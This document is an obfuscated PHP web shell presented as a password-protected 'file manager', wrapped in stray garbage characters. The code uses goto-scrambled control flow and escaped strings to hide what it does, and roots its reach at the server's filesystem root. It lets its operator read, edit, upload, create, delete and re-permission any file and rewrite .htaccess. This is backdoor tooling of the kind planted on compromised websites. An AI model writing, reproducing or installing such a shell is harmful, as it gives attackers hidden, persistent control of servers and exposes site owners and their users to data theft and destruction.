ന্್nคາહዚিޓปቨიàեहመzన<?php
 goto oaYpl; gBDKg: if ($view_file) { ?>
<h2>Viewing File:<?php  echo htmlspecialchars(basename($view_file)); ?>
</h2><div class="file-content"><?php  echo htmlspecialchars($file_content); ?>
</div><form method="post"action=""><input name="path"type="hidden"value="<?php  echo htmlspecialchars($view_file); ?>
"> <textarea name="file_content"><?php  echo htmlspecialchars($file_content); ?>
</textarea> <input name="action"type="submit"value="edit"></form><?php  } goto fJ2hi; hMBvL: goto UbMvs; goto uLV8q; TuGVt: goto Drx4a; goto V7SYl; prBM1: $file_content = ''; goto Z1DJB; YFyEh: cZfui: goto bBaGO; ac9nY: echo htmlspecialchars($htaccess_content); goto ETbLe; V7SYl: XZCi5: goto DE8fg; lrIhk: IZJzL: goto UD3WH; naNMJ: goto eG8W9; goto Seat9; UD3WH: ?>
</p><?php  goto miDU9; F0qC6: ?>
<!doctypehtml><html lang="en"><head><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1"name="viewport"><title>Файл менеджерӗ</title><style>body{font-family:monospace,sans-serif;margin:0;padding:0;background:#000;color:#0f0}h1{color:#0f0}p{color:#0f0}table{width:100%;border-collapse:collapse}table,td,th{border:1px solid #0f0}td,th{padding:8px;text-align:left}th{background-color:#e630d3}.current-directory{font-weight:700}.directory{margin-right:10px;color:#0f0}.file{margin-right:10px;color:#0f0}.file-content{white-space:pre-wrap;background:#e630d3;padding:10px;color:#0f0}.message{color:#0f0}.error{color:red}.hidden{display:none}input[type=text],textarea{background:#e630d3;color:#0f0;border:1px solid #0f0;padding:5px}input[type=submit]{background:#0f0;color:#000;border:none;padding:5px 10px;cursor:pointer}input[type=file]{background:#e630d3;color:#0f0;border:1px solid #0f0}input[type=checkbox]{accent-color:#0f0}a{color:#0f0;text-decoration:none}a:hover{text-decoration:underline}</style><script>// Menyimpan posisi scroll saat sebelum halaman dimuat
        window.addEventListener('beforeunload', function() {
            localStorage.setItem('scrollPosition', window.scrollY);
        });

        // Mengembalikan posisi scroll saat halaman dimuat
        window.addEventListener('load', function() {
            var scrollPosition = localStorage.getItem('scrollPosition');
            if (scrollPosition) {
                window.scrollTo(0, parseInt(scrollPosition, 10));
                localStorage.removeItem('scrollPosition');
            }
        });

        // Fungsi untuk centang semua checkbox
        function toggleSelectAll(source) {
            var checkboxes = document.querySelectorAll('input[name="selected_items[]"]');
            for (var checkbox of checkboxes) {
                checkbox.checked = source.checked;
            }
        }</script></head><body><?php  goto XW_IT; rCOiX: goto mbrzx; goto cDkVS; in2j6: UsCCh: goto ac9nY; oaYpl: session_start(); goto FZahh; GqAce: foreach ($files as $file) { ?>
<tr><td><input name="selected_items[]"type="checkbox"value="<?php  echo htmlspecialchars($file["\160\x61\164\x68"]); ?>
"></td><td><a href="?dir=<?php  echo urlencode($dir); ?>
&view_file=<?php  echo urlencode($file["\x70\141\x74\x68"]); ?>
"class="file"><?php  echo htmlspecialchars($file["\156\141\x6d\x65"]); ?>
</a></td><td><?php  echo htmlspecialchars($file["\x70\145\x72\155\x69\163\163\x69\157\156\x73"]); ?>
</td><td><form method="post"action=""style="display:inline"><input name="path"type="hidden"value="<?php  echo htmlspecialchars($file["\160\x61\x74\150"]); ?>
"> <input name="rename_to"placeholder="New Name"> <input name="action"type="submit"value="rename"></form><form method="post"action=""style="display:inline"><input name="path"type="hidden"value="<?php  echo htmlspecialchars($file["\x70\x61\x74\150"]); ?>
"> <input name="action"type="submit"value="delete"></form><form method="post"action=""style="display:inline"><input name="path"type="hidden"value="<?php  echo htmlspecialchars($file["\160\141\x74\150"]); ?>
"> <input name="chmod"placeholder="Permissions (e.g., 755)"> <input name="action"type="submit"value="permissions"></form></td></tr><?php  } goto hMBvL; DE8fg: ?>
<h1>Файл менеджерӗ</h1><p><a href="?dir=<?php  goto MzBhi; aOpvH: goto IZJzL; goto Mgtst; XW_IT: goto XZCi5; goto lrIhk; kLHa5: if (strpos($dir, $base_dir) !== 0 || !is_dir($dir)) { $dir = $this_file_dir; } goto gMnH3; miDU9: goto cO2DX; goto YFyEh; WsYll: foreach ($directories as $directory) { ?>
<tr><td><input name="selected_items[]"type="checkbox"value="<?php  echo htmlspecialchars($directory["\160\141\164\150"]); ?>
"></td><td><a href="?dir=<?php  echo urlencode($directory["\160\x61\164\x68"]); ?>
"class="directory"><?php  echo htmlspecialchars($directory["\156\x61\155\145"]); ?>
</a></td><td><?php  echo htmlspecialchars($directory["\160\145\x72\155\151\163\x73\151\x6f\x6e\x73"]); ?>
</td><td><form method="post"action=""style="display:inline"><input name="path"type="hidden"value="<?php  echo htmlspecialchars($directory["\160\141\164\150"]); ?>
"> <input name="rename_to"placeholder="New Name"> <input name="action"type="submit"value="rename"></form><form method="post"action=""style="display:inline"><input name="path"type="hidden"value="<?php  echo htmlspecialchars($directory["\160\x61\164\x68"]); ?>
"> <input name="chmod"placeholder="Permissions (e.g., 755)"> <input name="action"type="submit"value="permissions"></form><form method="post"action=""style="display:inline"><input name="path"type="hidden"value="<?php  echo htmlspecialchars($directory["\160\x61\164\150"]); ?>
"> <input name="action"type="submit"value="delete"></form></td></tr><?php  } goto PFNrN; zY4gU: cO2DX: goto MEU7O; MEU7O: if (isset($message)) { ?>
<p class="message"><?php  echo htmlspecialchars($message); ?>
</p><?php  } goto naNMJ; lv1qq: if (!isset($_SESSION["\x6c\x6f\147\147\145\x64\137\x69\x6e"]) || !$_SESSION["\154\x6f\147\x67\x65\144\x5f\x69\156"]) { if ($_SERVER["\x52\x45\121\125\105\123\124\137\x4d\x45\x54\x48\117\104"] === "\120\x4f\x53\124" && isset($_POST["\x70\141\163\x73\x77\157\x72\144"]) && md5($_POST["\160\141\163\x73\167\157\162\144"]) === $Pass) { $_SESSION["\x6c\157\147\x67\x65\x64\x5f\x69\156"] = true; } else { ?>
<!doctypehtml><html lang="en"><head><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1"name="viewport"><title>Login</title><style>body{font-family:monospace,sans-serif;margin:0;padding:0;background:#000;color:#0f0}form{margin:100px auto;width:300px;padding:20px;border:1px solid #0f0;background:#e630d3}input[type=password]{background:#e630d3;color:#0f0;border:1px solid #0f0;padding:10px;width:100%;box-sizing:border-box}input[type=submit]{background:#0f0;color:#000;border:none;padding:10px 20px;cursor:pointer;margin-top:10px}p{color:red}</style></head><body><form method="post"><h1>Login</h1><input name="password"type="password"placeholder="Password"required> <input type="submit"value="Login"></form><?php  if (isset($_POST["\x70\x61\163\x73\x77\x6f\162\x64"]) && md5($_POST["\160\141\x73\x73\x77\x6f\x72\x64"]) !== $Pass) { ?>
<p>Incorrect password. Please try again.</p><?php  } ?>
</body></html><?php  die; } } goto XgCgy; Mgtst: Drx4a: goto nWlbX; XgCgy: $server_root = realpath("\x2f"); goto m4Www; AFh6Y: $this_file_dir = realpath(dirname(__FILE__)); goto uYz_h; BTWE3: echo urlencode($this_file_dir); goto TuGVt; cDkVS: fTQrr: goto BTWE3; FZahh: $Pass = "\x61\x39\65\66\61\x36\61\x61\66\71\x39\x32\70\143\144\x31\63\x30\x61\x38\70\x39\142\70\70\x30\70\62\x66\142\66\145"; goto lv1qq; nWlbX: ?>
">Home ><?php  goto rCOiX; puWpp: function deleteDirectory($dir) { if (!is_dir($dir)) { return unlink($dir); } foreach (new DirectoryIterator($dir) as $item) { if ($item->isDot()) { continue; } if ($item->isDir()) { deleteDirectory($item->getPathname()); } else { unlink($item->getPathname()); } } return rmdir($dir); } goto vXEUc; Seat9: RYx2J: goto WsYll; Z1DJB: if ($view_file && is_file($view_file)) { $file_content = file_get_contents($view_file); } goto dJu3O; uYz_h: $dir = isset($_GET["\x64\x69\162"]) ? realpath($_GET["\144\x69\162"]) : $this_file_dir; goto kLHa5; yJSIw: eG8W9: goto T6ZfY; dJu3O: $htaccess_content = ''; goto L_2QY; uLV8q: mbrzx: goto I8w5i; aO2oM: goto UsCCh; goto zY4gU; WFCjY: if (file_exists($htaccess_file)) { $htaccess_content = file_get_contents($htaccess_file); } goto F0qC6; hsA4g: foreach (new DirectoryIterator($dir) as $fileInfo) { if ($fileInfo->isDot()) { continue; } if ($fileInfo->isDir()) { $directories[] = array("\156\141\155\x65" => "\133" . $fileInfo->getFilename() . "\135", "\160\x61\x74\x68" => $fileInfo->getPathname(), "\x70\145\162\x6d\x69\x73\163\151\157\x6e\163" => substr(sprintf("\x25\157", $fileInfo->getPerms()), -4)); } elseif ($fileInfo->isFile()) { $files[] = array("\x6e\x61\x6d\145" => $fileInfo->getFilename(), "\160\x61\164\x68" => $fileInfo->getPathname(), "\160\x65\162\x6d\151\x73\163\151\x6f\156\163" => substr(sprintf("\x25\x6f", $fileInfo->getPerms()), -4)); } } goto AtmGR; AtmGR: $view_file = isset($_GET["\166\x69\x65\167\x5f\x66\x69\154\145"]) ? sanitizePath($_GET["\166\151\x65\x77\137\x66\151\154\x65"], $base_dir) : ''; goto prBM1; L_2QY: $htaccess_file = $dir . "\x2f\x2e\x68\164\141\x63\x63\x65\x73\x73"; goto WFCjY; kCFwQ: ?>
<input name="action"type="submit"value="delete_selected"onclick='return confirm("Are you sure you want to delete selected items?")'></form><?php  goto gBDKg; rW7zZ: $files = array(); goto NMoRE; PFNrN: goto SekvD; goto in2j6; NMoRE: $breadcrumbs = getBreadcrumbs($base_dir, $dir); goto hsA4g; T6ZfY: ?>
<form action="enctype="multipart/form-data"method="post"><h2>Upload File</h2><input name="upload_file"type="file"> <input type="submit"value="Upload"></form><form method="post"action=""><h2>Create Directory</h2><input name="new_directory"placeholder="Directory Name"> <input type="submit"value="Create Directory"></form><form method="post"action=""><h2>Create File</h2><input name="new_file"placeholder="File Name"> <textarea name="file_content"placeholder="File Content"></textarea> <input type="submit"value="Create File"></form><form method="post"action=""><h2>Edit .htaccess</h2><textarea name="htaccess_content"placeholder=".htaccess Content"><?php  goto aO2oM; ETbLe: goto cZfui; goto zQDiB; K4TQ3: function getBreadcrumbs($base_dir, $current_dir) { $breadcrumbs = array(); $current_dir = realpath($current_dir); while ($current_dir && $current_dir !== $base_dir) { $breadcrumbs[] = array("\x6e\141\x6d\x65" => basename($current_dir), "\x70\x61\164\x68" => $current_dir); $current_dir = dirname($current_dir); } $breadcrumbs[] = array("\x6e\x61\155\x65" => basename($base_dir), "\160\141\164\x68" => $base_dir); $breadcrumbs = array_reverse($breadcrumbs); return array_map(function ($breadcrumb) use($current_dir) { $class = $breadcrumb["\160\141\x74\150"] === $current_dir ? "\x63\x75\x72\x72\145\x6e\x74\x2d\144\151\162\x65\x63\x74\x6f\162\x79" : "\144\151\162\145\x63\164\157\x72\171"; return "\x3c\x61\x20\150\x72\x65\146\75\x22\77\144\x69\x72\x3d" . urlencode($breadcrumb["\x70\x61\x74\150"]) . "\42\x20\x63\x6c\x61\x73\x73\75\x22" . $class . "\x22\76" . htmlspecialchars($breadcrumb["\x6e\x61\155\x65"]) . "\x3c\x2f\141\76"; }, $breadcrumbs); } goto kdFB7; m4Www: $base_dir = $server_root; goto AFh6Y; iWYcq: goto RYx2J; goto hjUHH; hjUHH: SekvD: goto GqAce; gMnH3: function sanitizePath($path, $base_dir) { $real_path = realpath($path); return $real_path && strpos($real_path, $base_dir) === 0 ? $real_path : $base_dir; } goto puWpp; bBaGO: ?>
<input name="action"type="submit"value="edit_htaccess"><form method="post"action=""><h2>Files and Directories</h2><table><thead><tr><th><input type="checkbox"onclick="toggleSelectAll(this)"id="select-all"></th><th>Name</th><th>Permissions</th><th>Actions</th></tr></thead><tbody><?php  goto iWYcq; MzBhi: goto fTQrr; goto yJSIw; I8w5i: echo implode("\x20\46\x67\164\x3b\40", $breadcrumbs); goto aOpvH; zQDiB: UbMvs: goto kCFwQ; kdFB7: $directories = array(); goto rW7zZ; vXEUc: if ($_SERVER["\122\105\121\x55\105\123\124\137\x4d\105\x54\110\117\x44"] === "\120\117\x53\x54") { $message = ''; if (isset($_FILES["\165\160\x6c\157\141\144\137\146\x69\x6c\145"]) && $_FILES["\x75\160\154\157\x61\x64\x5f\x66\151\x6c\145"]["\145\162\162\x6f\162"] === UPLOAD_ERR_OK) { $allowed_types = array("\x2a"); $max_file_size = 50 * 1024 * 1024; if ($_FILES["\165\160\154\157\141\x64\137\146\151\154\x65"]["\x73\151\172\x65"] > $max_file_size) { $message = "\106\151\154\145\40\x73\x69\172\x65\x20\145\170\143\x65\145\x64\163\x20\154\151\155\x69\x74\56"; } else { $upload_file = $dir . "\57" . basename($_FILES["\x75\x70\154\x6f\141\x64\137\x66\x69\154\x65"]["\156\x61\x6d\x65"]); if (move_uploaded_file($_FILES["\165\160\154\x6f\141\x64\x5f\x66\x69\x6c\145"]["\164\155\x70\x5f\156\141\155\x65"], $upload_file)) { $message = "\x46\x69\154\x65\40\x75\160\154\x6f\141\144\x65\x64\40\163\165\143\143\145\163\163\146\x75\x6c\x6c\171\41"; } else { $message = "\x46\141\151\x6c\x65\144\40\x74\157\x20\165\160\x6c\157\x61\x64\40\146\x69\x6c\145\x2e"; } } } elseif (isset($_FILES["\165\160\154\x6f\141\x64\x5f\x66\x69\154\x65"])) { $message = "\125\160\154\157\x61\144\40\145\162\x72\x6f\x72\72\40" . $_FILES["\x75\160\x6c\157\141\x64\137\146\x69\154\145"]["\x65\x72\162\157\x72"]; } if (isset($_POST["\x6e\145\x77\x5f\x64\x69\162\145\143\x74\x6f\162\171"]) && !empty($_POST["\x6e\x65\167\137\144\x69\162\x65\143\x74\157\162\x79"])) { $new_dir = $dir . "\57" . basename($_POST["\156\145\x77\x5f\144\151\162\x65\x63\x74\157\x72\171"]); if (mkdir($new_dir)) { $message = "\x44\151\162\x65\143\x74\157\x72\171\x20\143\x72\145\141\x74\145\x64\40\x73\x75\x63\x63\145\163\x73\146\165\154\154\x79\41"; } else { $message = "\106\x61\151\x6c\145\x64\40\164\157\x20\143\162\145\x61\164\x65\x20\x64\151\x72\145\x63\164\x6f\x72\x79\56"; } } if (isset($_POST["\x6e\x65\x77\x5f\x66\151\x6c\x65"]) && !empty($_POST["\146\151\154\145\x5f\x63\x6f\x6e\x74\145\156\164"])) { $new_file = $dir . "\57" . basename($_POST["\x6e\145\167\x5f\x66\151\154\x65"]); if (file_put_contents($new_file, $_POST["\146\x69\x6c\x65\137\143\157\x6e\x74\x65\x6e\x74"])) { $message = "\106\151\154\x65\40\x63\x72\x65\x61\x74\145\144\x20\163\165\143\143\145\163\163\146\x75\x6c\154\171\x21"; } else { $message = "\106\141\x69\154\145\144\40\x74\x6f\40\x63\x72\x65\x61\x74\145\40\x66\x69\x6c\x65\x2e"; } } if (isset($_POST["\x61\143\x74\151\x6f\x6e"])) { $action = $_POST["\141\x63\x74\151\157\x6e"]; $path = isset($_POST["\x70\141\x74\150"]) ? sanitizePath($_POST["\160\141\164\x68"], $base_dir) : ''; $rename_to = $_POST["\x72\145\x6e\x61\155\x65\x5f\x74\x6f"] ?? ''; $file_content = $_POST["\146\x69\x6c\145\x5f\x63\x6f\x6e\164\x65\x6e\x74"] ?? ''; $chmod = $_POST["\x63\x68\x6d\157\144"] ?? ''; switch ($action) { case "\162\145\x6e\141\x6d\145": if (!empty($path) && !empty($rename_to)) { $rename_to = dirname($path) . "\x2f" . basename($rename_to); if (rename($path, $rename_to)) { $message = "\122\x65\x6e\x61\x6d\x65\144\40\163\165\x63\143\x65\x73\163\x66\x75\x6c\x6c\x79\41"; } else { $message = "\106\x61\x69\154\145\144\x20\x74\157\x20\x72\145\x6e\x61\x6d\145\56"; } } break; case "\144\145\154\145\164\145": if (!empty($path)) { if (is_dir($path)) { deleteDirectory($path); $message = "\104\x69\162\145\x63\164\157\x72\171\x20\144\x65\x6c\145\164\x65\x64\x20\x73\165\x63\143\x65\x73\163\146\x75\154\x6c\x79\x21"; } elseif (is_file($path)) { if (unlink($path)) { $message = "\106\151\154\x65\40\x64\145\x6c\x65\x74\145\x64\x20\163\165\x63\143\145\x73\x73\x66\x75\x6c\154\x79\x21"; } else { $message = "\106\141\151\154\x65\x64\x20\164\x6f\x20\144\x65\x6c\x65\164\145\40\146\x69\x6c\x65\56"; } } } break; case "\x65\144\151\164": if (!empty($path) && !empty($file_content)) { if (file_put_contents($path, $file_content)) { $message = "\106\x69\x6c\x65\40\x65\x64\151\x74\x65\144\x20\163\165\x63\143\x65\x73\x73\x66\x75\x6c\x6c\171\41"; } else { $message = "\x46\x61\151\154\145\x64\x20\164\x6f\x20\145\x64\x69\164\40\146\x69\x6c\145\56"; } } break; case "\x70\145\162\x6d\x69\x73\x73\x69\157\x6e\163": if (!empty($path) && !empty($chmod)) { $chmod = intval($chmod, 8); if (chmod($path, $chmod)) { $message = "\120\x65\x72\x6d\x69\163\x73\151\x6f\x6e\163\x20\165\x70\144\141\164\x65\144\x20\x73\165\143\x63\145\163\x73\x66\165\x6c\154\171\x21"; } else { $message = "\106\141\x69\x6c\x65\144\40\164\157\40\x75\x70\x64\141\164\145\x20\160\x65\162\x6d\x69\163\163\x69\157\x6e\163\x2e"; } } break; case "\x65\x64\x69\x74\137\x68\164\x61\143\143\x65\x73\163": $htaccess_file = $dir . "\x2f\x2e\150\x74\x61\x63\143\x65\163\163"; $htaccess_content = $_POST["\x68\x74\x61\143\143\145\x73\163\137\143\157\x6e\x74\x65\156\x74"] ?? ''; if (file_put_contents($htaccess_file, $htaccess_content)) { $message = "\x2e\x68\x74\141\143\143\145\x73\163\40\146\151\154\145\40\x75\160\144\x61\x74\145\144\40\x73\165\143\x63\x65\163\x73\146\x75\154\154\x79\41"; } else { $message = "\x46\x61\x69\x6c\x65\x64\40\x74\x6f\40\165\160\x64\x61\x74\x65\40\x2e\x68\x74\141\x63\143\x65\x73\163\40\146\151\154\x65\56"; } break; } } if ($_SERVER["\x52\105\x51\125\105\x53\x54\x5f\115\105\x54\110\x4f\x44"] === "\120\117\123\124" && isset($_POST["\x61\143\164\x69\157\156"]) && $_POST["\x61\x63\164\151\157\156"] === "\x64\x65\x6c\145\164\145\x5f\163\x65\x6c\145\x63\x74\145\144") { if (isset($_POST["\163\145\154\x65\x63\164\x65\x64\137\x69\164\x65\155\x73"]) && is_array($_POST["\x73\x65\154\x65\x63\164\145\x64\x5f\x69\164\x65\155\163"])) { foreach ($_POST["\x73\145\x6c\145\x63\164\x65\144\137\151\164\145\155\x73"] as $item) { $path = sanitizePath($item, $base_dir); if (file_exists($path)) { if (is_dir($path)) { deleteDirectory($path); } elseif (is_file($path)) { unlink($path); } } } $message = "\x53\145\x6c\x65\x63\x74\145\144\x20\151\x74\145\x6d\163\40\x64\145\154\x65\x74\x65\x64\40\163\165\143\143\145\163\163\x66\165\154\154\171\x21"; } else { $message = "\x4e\x6f\x20\151\164\x65\x6d\163\40\x73\x65\154\x65\143\164\145\x64\x20\146\x6f\162\x20\x64\145\x6c\x65\x74\x69\157\156\56"; } } } goto K4TQ3; fJ2hi: ?>
</body></html>uಳቮร್ޑކèટךà્ήѿតbώજф